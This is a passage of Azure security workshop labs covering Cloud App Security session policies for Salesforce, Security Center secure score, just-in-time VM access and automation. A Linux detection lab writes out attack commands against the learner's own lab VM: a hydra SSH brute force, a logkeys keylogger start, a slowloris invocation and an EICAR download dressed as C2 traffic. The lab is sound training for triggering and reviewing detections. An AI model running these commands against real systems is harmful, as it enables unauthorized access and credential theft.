12. [] Copy/paste the information from the **Quick reference** to the Salesforce **single sign-on settings** page.

    a.In the Name textBox, type the name of the configuration: **AzureAD**.

    b. Paste **Azure AD SAML Entity ID** value into the **Issuer** textBox.

    c. In the **Entity Id** textBox, type in the **Sign On URL** that you entered in **Step 1**, which should be in this format: **http://company.my.salesforce.com**

    d. Download the **Azure AD Signing Certificate** in the Azure portal and then click **Browse** to upload the downloaded certificate Azure AD Signing Certificate in the **Salesforce setting page**.

    e. As **SAML Identity Type**, select **Assertion contains the Federation ID** from the User object.

    f. As **SAML Identity Location**, select **Identity is in the NameIdentifier element of the Subject statement**.

    g. Paste **Azure AD Single Sign-On Service URL** into the **Identity Provider Login URL** textBox.

    h. Salesforce does not support SAML logout. As a workaround, paste **Azure AD Sign Out URL** into the **Identity Provider Logout URL** textBox.

    i. As **Service Provider Initiated Request Binding**, select **HTTP POST**.

    j. Click Save.

    !IMAGE[Add SF](\Media\appc-app16.png "Add SF")

    !IMAGE[Add SF](\Media\appc-app17.png "Add SF")

13. [] Go back to **My Domain** in Salesforce and in **Authentication Configuration**, click on **Edit**. You will be redirected to another page.

    !IMAGE[Add SF](\Media\appc-app18.png "Add SF")

14. [] In **Authentication Configuration**, un-check the **Login Page** checkBox and check the **Azure AD** checkBox. Click on Save. When back on the configuration page, click on the **login** button to complete the configuration.

    !IMAGE[Add SF](\Media\appc-app19.png "Add SF")

    !IMAGE[Add SF](\Media\appc-app20.png "Add SF")

    !IMAGE[Add SF](\Media\appc-app20a.png "Add SF")

    !IMAGE[Add SF](\Media\appc-app20b.png "Add SF")

---

## Deploy Salesforce to your users

[:arrow_up: Top](#conditional-Access-App-Control)

We will now provide access to our users and validate the SSO experience.

1. [] Go back to the Azure AD portal, within the **SalesforceCAS** app and choose **Users and groups**

    !IMAGE[Assign users](\Media\appc-app21.png "Assign users")

2. [] Click on **+ Add user**. Choose your admin account as the user (e.g.,admin@ems123456.onmicrosoft.com) and select **System Administrator** as the Role. Click on **Assign**

    !IMAGE[Assign users](\Media\appc-app22.png "Assign users")

    !IMAGE[Assign users](\Media\appc-app23.png "Assign users")

    !IMAGE[Assign users](\Media\appc-app24.png "Assign users")

    > [!ALERT] If you want to assign Salesforce to more users, you must create a user for them in Salesforce as we didn't configured **provisionning**. Our admin account already has an an account matching his UPN, created during the Salesforce configuration.

3. [] Test the setup by going to [https://myapps.microsoft.com](https://myapps.microsoft.com) with your admin account and click on the **SalesforceCAS** app. You should then experience SSO to Salesforce.

    !IMAGE[Test SSO](\Media\appc-app25.png "Test SSO")

    !IMAGE[Test SSO](\Media\appc-app26.png "Test SSO")

    :warning: If you receive an error message, verify that you validated the SSO configuration by clicking on the **Log in** button in **step 14**.

===

## Deploy the reverse proxy capability for Salesforce

[:arrow_up: Top](#conditional-Access-App-Control)

The next step of the configuration is to create a Conditional access policy in Azure AD and then complete the configuration in Cloud App Security.

> [!HINT] Soon, you will be able to perform the full configuration from the Azure AD conditional access policy configuration pane.

1. [] In Azure Active Directory, under **Security**, click on **Conditional access**.

    !IMAGE[Configure policy](\Media\appc-policy1.png "Configure policy")

2. [] Click on **New policy** and create a new policy.

    !IMAGE[Configure policy](\Media\appc-policy2.png "Configure policy")

3. [] Use the following settings in your policy.

    **Name**: Test Cloud App Security proxy
    **Assignment**: choose your admin
    **Cloud apps**: SalesforceCAS
    **Access control / Session**: Use Conditional Access App Control **checkBox**

    !IMAGE[Configure policy](\Media\appc-policy3.png "Configure policy")

    !IMAGE[Configure policy](\Media\appc-policy4.png "Configure policy")

    !IMAGE[Configure policy](\Media\appc-policy5.png "Configure policy")

4. [] Enable your policy and click on **Create**

    !IMAGE[Configure policy](\Media\appc-policy6.png "Configure policy")

    !IMAGE[Configure policy](\Media\appc-policy7.png "Configure policy")

5. [] After the policy was created successfully, open a new browser, ***make sure you are logged out***, go to ```https://myapps.microsoft.com```, connect with the admin user and click on the SalesforceCAS tile.

6. [] Go back to the Cloud App Security portal, and under the settings cog choose **Conditional Access App Control**.

    !IMAGE[Configure policy](\Media\appc-policy8.png "Configure policy")

    You should see know that Salesforce has been discovered and need to continue the setup.

    !IMAGE[Configure policy](\Media\appc-policy9.png "Configure policy")

    > [!HINT] If the message does not appear, go back to step 5. (After the policy was created...) this time, close the browser and open a new browser in Incognito mode.

    In the dialog that opens, click on **Add**.

    !IMAGE[Configure policy](\Media\appc-policy10.png "Configure policy")

    !IMAGE[Configure policy](\Media\appc-policy11.png "Configure policy")

    The deployment is now **complete**!

### Configure device authentication

[:arrow_up: Top](#conditional-Access-App-Control)

Conditional Access App Control is capable to identify company devices using either Azure AD, Intune or certificates (provided by 3rd party MDM for example). We will here simulate the 3rd party MDM scenario, using client certificates.

1. [] Go to the settings and at the bottom of the page, choose **Device identification**.

    !IMAGE[Device authentication](\Media\appc-device1.png "Device authentication")

2. [] Click on the **Browse** button and upload the **CASTestCA.crt** certificate from the **Client Certificate** folder within the **Demofiles.zip** file you've received as the certificate authority root certificate.

    !IMAGE[Device authentication](\Media\appc-device2.png "Device authentication")

    !IMAGE[Device authentication](\Media\appc-device3.png "Device authentication")

    !IMAGE[Device authentication](\Media\appc-device4.png "Device authentication")

---

### Create a session policy

[:arrow_up: Top](#conditional-Access-App-Control)

To control our users sessions to Salesforce, we have now to create a **policy**.

1. [] In the Cloud App Security portal, select **Control** followed by **Policies**.

    !IMAGE[Session policy](\Media\appc-session1.png "Session policy")

2. [] In the **Policies** page, click **Create policy** and select **Session policy**.

    !IMAGE[Session policy](\Media\appc-session2.png "Session policy")

3. [] In the **Session policy** window, assign a name for your policy, such as **Block download of sensitive documents to unmanaged devices** and in the **Session control type** field, select **Control file download (with DLP)**

     !IMAGE[Session policy](\Media\appc-session3.png "Session policy")

4. [] Under **Activity source** in the **Activities matching all of the following** section, select the following activity filters to apply to the policy:

    **Device tags** does not equal **Valid client certificate**
    **App** equals **Salesforce**
    Check the **Enabled** checkBox near **Content inspection**

    !IMAGE[Session policy](\Media\appc-session4.png "Session policy")

5. [] Check the **Include files that match a preset expression** radio button. In the dropdown menu just below the radio button, scroll all the way to the end to choose **US: PII: Social security number** and check the **Don't require relevant context** checkBox, just below the dropdown menu.

    !IMAGE[Session policy](\Media\appc-session5.png "Session policy")

6. [] Under **Actions**, select **Block**. Check the **Customize block message** checkBox, and add a custom message in the textBox that has opened, e.g.: "This file is sensitive"

    !IMAGE[Session policy](\Media\appc-session6.png "Session policy")

7. [] Click on **Create**

8. [] Create a second **Session policy** called **Protect download to unmanaged devices**. In the **Session control type** field Select **Control file download (with DLP)**.

    !IMAGE[Session policy](\Media\appc-session7.png "Session policy")

9. [] Under **Activity source** in the **Activities matching all of the following** section, select the following activity filters to apply to the policy:

    **Device tags** does not equal **Valid client certificate**
    **App** equals **Salesforce**

    !IMAGE[Session policy](\Media\appc-session8.png "Session policy")

10. [] Check the **Enabled** checkBox near **Content inspection**. Under **Actions**, select **Protect**

    !IMAGE[Session policy](\Media\appc-session9.png "Session policy")

11. [] Click on **Create**

12. [] Disable this policy

---

### Test the user experience

[:arrow_up: Top](#conditional-access-app-control)

1. [] Extract the file **silvia.pfx** from the **Client Certificate** folder in **Demo files.zip** file you've received

2. [] Double click on the **silvia.pfx** file, click **Next**, **Next**, enter the password **acme**, click **Next**, **Next**, **Finish**.

3. [] Open a new browser in an Incognito mode

4. [] Go to [https://myapps.microsoft.com](https://myapps.microsoft.com) and login with the admin user.

5. [] Click on the **SalesforceCAS** icon.

6. [] You should now see a certificate prompt. Click on **Cancel**.

    > [!HINT] This will simulate a connection from an unmannaged device. **In a real demo**, you can open two different browsers, side by side, and show the user experience from a managed and unmanaged device by clicking on **OK** in one browser and **Cancel** in the other.

   !IMAGE[Session policy](\Media\appc-session10.png "Session policy")

7. [] You should then see a Monitored access message, click on **Continue to Salesforce** to continue.

    !IMAGE[Session policy](\Media\appc-session11.png "Session policy")

8. [] Now you are logged in to Salesforce. Click on + and go to Files

    !IMAGE[d0ik67yl.jpg](\Media\d0ik67yl.jpg)

9. [] Upload the files **Personal employees information.docx** and **Protect with Microsoft Cloud App Security proxy.pdf** from the **Demo files.zip** file to the Files page in Salesforce

10. [] Download the **Protect with Microsoft Cloud App Security proxy.pdf** files and see that it is downloaded, and you can open it.

11. [] Download the **Personal employees information.docx** file and see that you get a blocking message and instead of the file, you get a **Blocked...txt** file.

   !IMAGE[wvk16zl2.jpg](\Media\wvk16zl2.jpg)

---

### Test the admin experience

[:arrow_up: Top](#conditional-access-app-control)

1. [] Go back to the Cloud App Security portal, and under **Investigate**  choose **Activity log**

2. [] See the login activity that was redirected to the session control, the file download that was not blocked, and the file download that was blocked because it matched the policy.

# Azure Security Center
[:arrow_left: Home](#introduction)

Azure Security Center is a unified infrastructure security management system that strengthens the security posture of your data centers, and provides advanced threat protection across your hybrid workloads in the cloud - whether they're in Azure or not - as well as on premises.

Keeping your resources safe is a joint effort between your cloud provider, Azure, and you, the customer. You have to make sure your workloads are secure as you move to the cloud, and at the same time, when you move to IaaS (infrastructure as a service) there is more customer responsibility than there was in PaaS (platform as a service), and SaaS (software as a service). Azure Security Center provides you the tools needed to harden your network, secure your services and make sure you're on top of your security posture.

> !IMAGE[Map](\Media\sc-net-map.png)

### Azure Security Center addresses the three most urgent security challenges:

- **Rapidly changing workloads** – It’s both a strength and a challenge of the cloud. On the one hand, end users are empowered to do more. On the other, how do you make sure that the ever-changing services people are using and creating are up to your security standards and follow security best practices?
	> !IMAGE[score](\Media\sc-secure-score.png)

- **Increasingly sophisticated attacks** - Wherever you run your workloads, the attacks keep getting more sophisticated. You have to secure your public cloud workloads, which are, in effect, an Internet facing workload that can leave you even more vulnerable if you don't follow security best practices.
	> !IMAGE[score](\Media\sc-recommendations.png)

- **Security skills are in short supply** - The number of security alerts and alerting systems far outnumbers the number of administrators with the necessary background and experience far to make sure your environments are protected. Staying up-to-date with the latest attacks is a constant challenge, making it impossible to stay in place while the world of security is an ever-changing front.
	
	> !IMAGE[Attacks](\Media\sc-brute-force.png)
	
### To help you protect yourself against these challenges, Security Center provides you with the tools to:

- **Strengthen security posture**: Security Center assesses your environment and enables you to understand the status of your resources, are they secure or not?
	
	> !IMAGE[Dashboard](\Media\sc-dashboard.png)

- **Protect against threats**: Security Center assesses your workloads and raises threat prevention recommendations and threat detection alerts.
	
	> !IMAGE[sc-attack-recommendation.png](\Media\sc-attack-recommendation.png)

- **Get secure faster**: In Security Center, everything is done in cloud speed. Because it is natively integrated, deployment of Security Center is easy, providing you with autoprovisioning and protection with Azure services.

The Azure Security Center labs are divided into 2 tracks, a beginner (level 50/100) and an advanced (level 300+) track.

### Edit workspace settings (Including Data Collection settings)
1. [] Go back one more time to the **Security policy** blade, but this time click on **Edit settings** on the line where your **workspace** is listed:

	> !IMAGE[alt text](\Media\policy_setting7.png)
	
	> [!NOTE] This allows you to configure the Windows security events collection settings for your workspace and helps you to perform auditing, investigation and and analysis.
	> Notice that the options are potentially grayed out.
	> If so, you first need to set the workspace Pricing tier to Standard.
2. [] Click on **Pricing tier** and set the pricing tier to **Standard** and click on **Save**
3. [] Click on **Data collection**, you should now be able to configure the Windows security events collection
4. [] Set the collection to **All Events** and click on **Save**

	> !IMAGE[alt text](\Media\policy_setting8.png)
	
	> [!NOTE] You don't have to change the setting **None** to receive alerts in Security Center, change this setting only if you want to do investigations and analysis of your threats in Log Analytics.

### Secure Score

In the beginning of this lab, you explored briefly the **Secure Score** tile. Let's look a little bit deeper into it. 

Security Center mimics the work of the security analyst, reviewing your security recommendations and applying advanced algorithms to determine how crucial each recommendation is.

1. [] Go to the **Security Center Overview** blade
2. [] Click on the **Secure score** tile and then under **Secure score by category** click on **Compute & apps**

	> !IMAGE[alt text](\Media\secure_score_dashboard.png)
3. [] Observe the number under the **Secure score impact column** and the affected **Resource** column. This helps in prioritizing working on the recommendations, the higher the number, the greater the impact 
4. [] Click on a recommendation, for example **Install endpoint protection solution on virtual machines**

	> !IMAGE[alt text](\Media\install_endpoint_protection1.png)
5. [] Click on **Install on 1 VMs**:

	> !IMAGE[alt text](\Media\install_endpoint_protection2.png)
6. [] Select **Microsoft Antimalware** and click on **Create** (scroll down if you don't see the Create button):

	> !IMAGE[alt text](\Media\install_endpoint_protection3.png)

	1. [] Provide your settings of choice, then click **OK**, this starts the endpoint protection installation.

	> [!NOTE] Another example which might not exist in your lab environment is a recommendation for containers:
	>
	> !IMAGE[alt text](\Media\secure_score3.png)

The example above is based on Container security monitoring (you have a lab that deploys a docker container). It shows the **Recommendation impact**, the **Threats** found and the **Remediation steps**

# VM Protection with Just in Time (JIT) access
[:arrow_left: Home](#azure-security-center)

##### Estimated lab time: 15 minutes

***Requirements**:*
Make sure before continuing with this lab that:
1. [] The VM's that you have deployed earlier are showing as **Monitored by Azure Security Center**. You can find this setting under **Security Center>Compute & Apps***
2. [] You have completed the **Policy and Compliance** lab (specifically implementing the missing NSG recommendation)

	> [!NOTE] In this lab you will protect your VMs with Just-In-Time (JIT) access. JIT has been released, but in this lab we will show you an additional JIT feature, showcasing the JIT integration with Azure
	>
	> The steps below are showcasing a preview feature which needs to be executed using a feature flag

### Enable JIT on a VM in ASC
1. [] Open the Azure portal at ```https://ms.portal.azure.com/?feature.canmodifystamps=true&feature.jitconnect=true```.

2. [] Navigate to **ASC > Just in time VM access** (under Advanced Cloud Defense)
3. [] Under **Recommended** select a VM which you have deployed earlier and click on the button **Enable JIT on**.
4. [] Optionally: add/delete ports by clicking on the 3 dots (...) on the right.
5. [] Click **Save**.
6. [] In the Azure portal (using the same session), navigate to **Virtual Machines**.
7. [] Select the VM you have enabled for JIT and in the Overview blade, click on **Connect**.
8. [] On the opened blade at the right, notice the banner saying **This VM has a just-in-time access policy**.

	> !IMAGE[alt text](\Media\ConnectVM_JIT_Enabled.png)

9. [] Click on the button **Request access**.
10. [] When you have the proper permission, access will be granted and you can now connect to the VM.

### Enable JIT on a VM from the Virtual Machine blade
1. [] In the same browser session, navigate to the **Virtual Machine** blade.
2. [] Select a VM for which you have not enabled JIT.
3. [] Click on **Connect** in the Overview blade.
4. [] Notice the banner saying **To improve security, enable just-in-time access**.

	> !IMAGE[alt text](\Media\EnableJITfromVMblade.png)
5. [] Click on the arrow pointing to the right (as shown in the previous image) and click on the button **Enable just-in-time policy**.

	> !IMAGE[alt text](\Media\EnableJITbutton.png)
6. [] You have now enabled JIT for this VM. You can click on the link **Open Azure Security Center** to edit or disable the policy.
7. [] When you have clicked on the link in the previous step, notice the column last access. That should say Active now, since we just enable JIT access to a VM in the previous steps.

	> !IMAGE[alt text](\Media\JitActiveNow.png)

### [Optional Lab] Enable custom JIT ports with PowerShell
***Requirements**:*

To enable JIT through PowerShell you can leverage the following syntax:
```
$myVM = Get-AzureRmVM -Name <VMname> -ResourceGroupName <resourceGroupName>
Set-AzureRmJitNetworkAccessPolicy -ResourceGroupName "<rescourceGroupName>" -Location "<location>" -Name "default" -VirtualMachine $myVM -Kind "Basic"
```
**In the following excercise you are going to enable JIT for a specific VM, configuring custom ports.**
1. [] Paste the PS code below into in your favorite PowerShell editor.

	```
	$AzureSubID = "<YourAzureSubscriptionID>"
	$vmName = "<YourVMName>"
	$resourceGroupName = "YourResourceGroupName"
	$location = "<YourLocation>"
	$duration = "PT3H" #=3hrs

	$JitPolicy = (@{
		id="/subscriptions/$AzureSubID/resourceGroups/$resourceGroupName/providers/Microsoft.Compute/virtualMachines/$vmName"
	ports=(@{
		number=22;
		protocol="*";
		allowedSourceAddressPrefix=@("*");
		maxRequestAccessDuration=$duration},
		@{
		number=3389;
		protocol="*";
		allowedSourceAddressPrefix=@("*");
		maxRequestAccessDuration= $duration})})

	$JitPolicyArray=@($JitPolicy)

	Set-AzureRmJitNetworkAccessPolicy -Kind "Basic" -Location $location -Name "default" -ResourceGroupName $resourceGroupName -VirtualMachine $JitPolicyArray
	```

2. [] Make sure you replace all the variables within **<>** and update the script with your required ports
3. [] Make sure that you are logged into Azure and that you have selected the Azure subscription which has been given to you
4. [] Excute the script. Make sure that you refresh the Azure portal after executing the script
5. [] Explore in ASC that the custom ports have been added to your JIT enabled VM

# Linux Detections
[:arrow_left: Home](#azure-security-center)

##### Estimated lab time: 25 minutes
*The following lab is based on the* <a href="https://gallery.technet.microsoft.com/Azure-Security-Center-0ac8a5ef" target="_blank">Linux Detections playbook</a> *written by Yuri Diogenes. This playbook provides a more comphrensive explanation than is covered in this lab*

In this lab we will explore the new Linux detection's in ASC by executing attacks in a Kali Linux VM that you are going to deploy. You will connect to your deployed Linux VM (Linux-0) leveraging SSH. In case you don't have a SSH client installed, you can install the free edition of MobaXterm <a href="https://mobaxterm.mobatek.net/download.html" target="_blank">here</a>.

#### Create a Kali Linux VM

> [!NOTE] The time to create the Kali Linux VM is approx 5 minutes. Make sure to add a port that enables you to connect.

1. [] In the Azure portal, click on **Create a resource** and search for **Kali Linux** and **create** the VM

	> !IMAGE[alt text](\Media\kali_marketplace.png)

	> [!NOTE] you don't have to wait until the deployment is complete. Proceed with the next exercise*

#### Create Linux users 
1. [] Connect to your Linux VM (Linux-0) that you have deployed earlier (note: not the Kali VM), using your favorite SSH tool
2. [] Create 5 users with the names user1, user2, user3, user4, user5, by leveraging the following Linux command 
	> [!NOTE] Replace "userName" by user1, user2, etc. Set the password to "mypassword1" for user1, "mypassword2" for user2, etc.*

```
sudo adduser <userName>
```


#### Executing a brute force attack
1. [] Connect to the Kali Linux VM with SSH (ensure that your VM deployment in step 1 was successful)
2. [] Navigate to the folder **/usr/share/wordlists**
3. [] Upload the **<a href="https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/05%20-%20Linux%20Detections/Files/lab_users.txt" target="_blank">lab_users.txt</a>** and **<a href="https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/05%20-%20Linux%20Detections/Files/lab_pass.txt" target="_blank">lab_pass.txt</a>** files to this folder by executing:

+++sudo wget https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/05%20-%20Linux%20Detections/Files/lab_users.txt+++

and

+++sudo wget https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/05%20-%20Linux%20Detections/Files/lab_pass.txt+++

4. [] Copy the IP address from the Linux Victim VM that you have deployed earlier. We are going to brute force attack this VM
5. [] Type the command below in your Kali VM, and replace "**IP**" with **yourLinuxVM** public IP address

+++hydra -I -L lab_users.txt -P lab_pass.txt <IP> -t 4 ssh+++

6. [] Wait until it finishes, and the result should show you the username and the password that was found

#### Simulate capturing credentials and other useful information
1. [] Run the command below in the Linux Victim VM to simulate an attacker that is trying to start logkeys to set up the system to capture credentials and other useful information: 

	+++logkeys --start+++

	> [!NOTE] Ignore the error message if you don't have logkeys installed. Security Center will detect this attack anyway*

#### Simulate an attack against a web server
Assuming that the attacker has already performed some internal recon using nmap, you are going to simulate an attack against a web server
1. [] Run the command below in the Linux Victim VM:

	+++perl slowloris.pl -dns server.contoso.com+++

	> [!NOTE] Ignore the error message if you don't have this script on your system. Security Center will detect this attack anyway*

#### Command & Control (C2) simulation
Attackers usually will communicate with command and control (C2) to transfer data or to download more  malicious software.
For this example, you will download the EICAR malware test file using WGET for the IP address.  The commands that follows must be executed in the Linux Victim VM:

1. [] First, obtain the IP address of the target:

+++nslookup eicar.com+++

2. [] Now replace the XXX.XXX.XXX.XXX on the command below with the IP obtained from nslookup: 

	+++wget http://XXX.XXX.XXX.XXX/download/eicar.com+++

	> [!NOTE]  if you have issues download eicar.com, try download eicar.txt (same command line, just change the extension).*

#### Review Security Center alerts
1. [] Navigate to the **Security Center>Security Alerts** blade (under Threat Protection)
2. [] Organize the alerts by date by clicking on the Date column, and review the alerts that were generated during this lab, it should look similar like this:

	> !IMAGE[alt text](\Media\Security_incident_detected_Linux.png)

	> !IMAGE[alt text](\Media\Security_incident_detected_Linux2.png)

# Automation with PowerShell
[:arrow_left: Home](#azure-security-center)

##### Estimated lab time: 15 minutes
In this lab you are going to explore what the ASC automation options with PowerShell are.

#### Requirements
You have received an Azure pass or you have a test environment available. Please don't use these lab exercises in a production environment (or at your own risk) 

For using these labs in combination with Labs On Demand (LOD), open an incognito/in-private browser session on your laptop and login to the Azure portal leveraging the LOD account (like for example admin@ems123456.onmicrosoft.com)

## AzureRm PowerShell cmdlets installation
1. [] Navigate to the Azure portal and click on **Virtual machines**
2. [] Click on your Windows virtual machine (**Win-0**)
3. [] Under **Overview** copy the **Public IP address** of your VM
4. [] Start a remote desktop session (RDP) and login to your VM, note: your default administrator account is is **azureadmin** (unless you have configured an other one)
5. [] Open an administrator PowerShell session
5. [] Install the AzureRm modules by typing in ***Install-Module -Name AzureRM -Verbose***

## Security Center PowerShell cmdlets installation
Security Center provides automation support through PowerShell as well.
The ASC PowerShell cmdlets can be downloaded from <a href="https://www.powershellgallery.com/packages/AzureRM.Security/0.2.0-preview" target="_blank">here</a>.

**Install the Security Center cmdlets in the Azure VM Win-0**
*The ASC cmdlets are in preview. It is recommended to install the ASC cmdlets in the Windows VM (like Win-0) that you have deployed earlier in your lab environment to avoid conflicts which might occur on your system.*

In the same administrator PowerShell session which you have already open on the Win-0 VM, install the ASC cmdlets by typing in the following commands and confirm all with "**yes**" if prompted:

***Tip**: copy and paste the script below in a PowerShell ISE administrator session* 
**Important**: Before executing the last step, make sure that you close the PowerShell session and open a new one

```
#Install NuGet
Install-Module -Name PowerShellGet -Force -Verbose 

#Install AzureRm.Profile
Install-Module -name AzureRM.Profile -Force -Verbose 

#Update the modules to ensure you have the latest versions
Update-Module PowerShellGet -Force -Verbose
Update-Module AzureRM.Profile -Force -Verbose

#Important: close your PowerShell session and open a new one

# Install the AzureRm.Security module
Install-Module -Name AzureRM.Security -AllowPrerelease -Verbose
```

### Exploring the Security Center cmdlets
***Assumptions**:
You have installed the AzureRm and Security Center PowerShell cmdlets, as mentioned in the beginning of this lab* 

Open on the **Win-0** VM an administrator PowerShell session.
Explore the Security Center cmdlets by executing:
```
Get-Command -Module AzureRm.Security
```
#### Configuring email settings

**Note**: make sure that in your favorite PowerShell editor, you are logged into Azure (using Login-AzureRmAccount)*

In the previous exercise we have configured the email notifications through ARM, let's now explore how to configure email settings through PowerShell.
Copy and paste the following script in your PowerShell editor:

```
#Set a security contact for the current scope. For the parameter "-Name", you need to use "default1", "default2", etc.

Set-AzureRmSecurityContact  -Name "default1" -Email "vader@empire.com" -Phone "12345" -AlertAdmin -NotifyOnAlert
```
#### Check the new email settings:
Run the following command:
```
Get-AzureRmSecurityContact
```

### Auto Provisioning settings
ASC's Auto Provisioning settings set to On will install the MMA VM extension automatically. Some customers prefer that to happen automatically, some customers like to control that.

#### Get the current Auto Provisioning settings
To retrieve the current Auto Provisioning settings, run the following:
```
Get-AzureRmSecurityAutoProvisioningSetting
```


#### Set Auto Provisioning to On

Enable automatic MMA VM extension installation:
```
Set-AzureRmSecurityAutoProvisioningSetting -Name "default" -EnableAutoProvision
```

#### Set Auto Provisioning to Off

Disable automatic MMA VM extension installation:
```
Set-AzureRmSecurityAutoProvisioningSetting -Name "default"
```

A sample which contains how to use the AzureRm.Security module can be found <a href="https://github.com/tianderturpijn/ASC/blob/master/PowerShell/Samples/ASC-Samples.ps1" target="_blank">here</a>. 
*In a later lab we will test drive how to configure Just-In-Time (JIT) with PowerShell.*

# Automation with ARM
[:arrow_left: Home](#azure-security-center)

##### Estimated lab time: 15 minutes
In this lab you are going to explore what the ASC automation options are leveraging Azure Resource Manager (ARM) templates

#### Requirements
1. [] You have completed **Automation with PowerShell**
2. [] You have received an Azure pass or you have a test environment available. Please don't use these lab exercises in a production environment (or at your own risk) 

For using these labs in combination with Labs On Demand (LOD), open an incognito/in-private browser session on your laptop and login to the Azure portal leveraging the LOD account (like for example admin@ems123456.onmicrosoft.com)



##  ARM Template deployment

#### Explore the ASC settings in the portal

1. [] Open a browser and login to the  <a href="https://portal.azure.com" target="_blank">Azure Portal</a>
2. [] Click on **Security Center**
3. [] Click on **Security Policy**
4. [] On the line where it shows your subscription, click on **Edit settings**
5. [] Explore the settings, specifically the **email notification settings**.
	
	> !IMAGE[alt text](\Media\asc_emailsettings.png)

For the first ARM deployment exercise we are going to start with configuring the **Email notification** settings

#### Explore the Email Notifications ARM template

1. [] Open the ```https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/09%20-%20Automation%20with%20ARM/Files/configureAscEmailNotifications.json``` ARM template for email notifications in a new browser window
2. [] Notice the ARM template **parameter** allowed values. These values are case sensitive and are mandatory.
3. [] Under the ARM resources section  (**Microsoft.Security/securityContacts**), use "default1", "default2", etc. as value for the field name. These are mandatory fields and can only be used in this format

#### Deploy the Email Notifications ARM template

1. [] Open your favorite PowerShell editor
2. [] Login to the Azure Portal by using **Login-AzureRmAccount**
3. [] Make sure that you have selected your Azure subscription which has been provided to you by using **Select-AzureRmSubscription** (only necessary if you have multiple subscriptions)
4. [] ASC resides at the subscription level, so we are going to target our ARM template deployment at the same level (instead of deploying it at the resource group level)
5. [] The syntax is *New-AzureRmDeployment -TemplateFile* `yourArmTemplateFile` (note: we are going to use a prepared ARM template JSON file)
6. [] Copy and paste the below in your PowerShell session and execute it:
**Note**:

- Use a proper email format like luke@skywalker.com
- Use only numbers (no spaces) as a phone number
- Fill in **On** or **Off** for alerts (case sensitive)
- If you receive an error running the New-AzureRmDeployment cmdlet, make sure to run this: **Install-Module -Name AzureRM.Resources**
```
New-AzureRmDeployment -TemplateFile 'https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/09%20-%20Automation%20with%20ARM/Files/configureAscEmailNotifications.json -location westus2'
```

7. [] After a successful completion, switch to the Azure portal and **refresh** (Ctrl+F5) the ASC blade and verify that the email settings have been updated according to the values in the template.
8. [] **[Optional exercise]** You can copy the template and use your own values

## Workspace creation

Security Centers stores MMA collected information (and more) in a Log Analytics workspace. ASC can create a default workspace automatically. This exercise is focused on using a custom workspace.

In the next exercise we will create a new workspace which will be used as your default ASC workspace.

#### Create a Log Analytics workspace
> [!NOTE] if you already have deployed a Log Analytics workspace you can skip this exercise, or create a second one to test drive multiple custom workspaces reporting up to ASC.*

You can either create a workspace through the Azure portal, leverage an ARM template, or use PowerShell.
1. [] Navigate to the Azure portal and create a Log Analytics workspace **OR**:
2. [] Copy, paste and run the following PowerShell script "as is" to deploy an ARM template which will deploy the <a href="https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/09%20-%20Automation%20with%20ARM/Files/createNewOmsWorkspace.json" target="_blank">newOmsWorkspace</a> ARM template: (optionally you can use your own values in the script below, like location, etc.) 
```
$myGuid = New-Guid
$RG = New-AzureRmResourceGroup -Name 'ASC-Lab-2' -Location 'eastus'

New-AzureRmResourceGroupDeployment -Name myWorkspaceDeploy -ResourceGroupName $RG.ResourceGroupName `
 -TemplateFile 'https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/09%20-%20Automation%20with%20ARM/Files/createNewOmsWorkspace.json' `
 -omsWorkspaceName ("ASC-workspace-$myGuid") -omsWorkspaceLocation "eastus" -Verbose
```
3. [] Switch to the Azure portal and open the **Security Center** blade
4. [] Click on **Security policy**
5. [] Your new created workspace should be listed under the **Policy Management** view 

	> [!NOTE] the ARM template deploys a new workspace with concatenating the workspace name with a GUID to ensure uniqueness.*
 
#### Change the Pricing tier and data collection settings of your workspace 
You can set the pricing tier and data collection settings per workspace, which is often not clear to customers, therefore we are going to set it in the portal instead of through automation (although you can automate it)
1. [] In the **Policy Management** view where your workspace is listed, click on **Edit settings** 

	> !IMAGE[alt text](\Media\pricing_workspace1.png)
2. [] Click on **Pricing tier** and note that by default it is set to **Free**
3. [] Click on **Standard** and click on **Save**
4. [] Click on **Data collection**
5. [] Under **Windows security events**, select **All events** (by default it is set to none)
6. [] Click on **Save**

#### Collect the WorkspaceID and WorkspaceKey
For the next (**optional**) exercise where we deploy a more advanced ASC ARM template, we are going to need the workspace details.
1. [] In the Azure portal, navigate to Log Analytics
2. [] Click on your **workspace**
3. [] On the Overview blade, make a note of the **Resource group name** and the **Subscription ID**
4. [] Click on **Advanced settings** and also make a note of the **workspaceID** and the **primaryKey**, since you need those  values for the next exercise

### [Optional Lab] More complex ARM template deployment

#### Deploy a more complex ASC configuration ARM template
Now that you have explored how to deploy an ARM template to configure an ASC setting, you are going to explore how to deploy a more complex ARM template. 
ASC stores MMA collected data (and more) in a Log Analytics workspace. In a more complex environment, you often will find an existing Log Analytics workspace which needs to be integrated with ASC (aka the Central Workspace scenario).
The following lab assumes that a (Central) Log Analytics workspace already exists (although this can be deployed with an ARM template at the same time) and you are going to configure ASC to use the existing Log Analytics workspace. In addition we are going to enable **Auto Provisioning** which will deploy the MMA extension automatically, as you would configure it in the portal, like this:

> !IMAGE[alt text](\Media\autoProvisioning_custom_%20Workspace.png)

Also we will configure ASC policies through the ARM template.

#### Explore the ASC advanced ARM template
1. [] Open the <a href="https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/09%20-%20Automation%20with%20ARM/Files/configureAscAdvanced.json" target="_blank">ASC Advanced ARM template</a> in a new browser window and explore it.
2. [] Look closely at the **parameters** and their allowed values
3. [] Under **resources**, observe the several settings that we will configure like autoProvisioning, workspace settings, etc. The recommendation policies can be configured one by one, but in this lab we will set the value to **On** or **Off** for all of them.
4. [] For ARM templates, it is recommended that you use a parameter file to pass values during a deployment if you don't want to type them in. In this lab we will just type them in and paste some values

#### 3 - Deploy the ASC advanced ARM Template

Your are going to deploy an ARM template which will configure a number of ASC settings and you will connect ASC with your workspace.

1. [] Switch to the PowerShell session where you are logged into Azure, with the correct subscription selected and copy & paste the following script. Make sure to update all values with the information you have collected in the previous exercises:
```
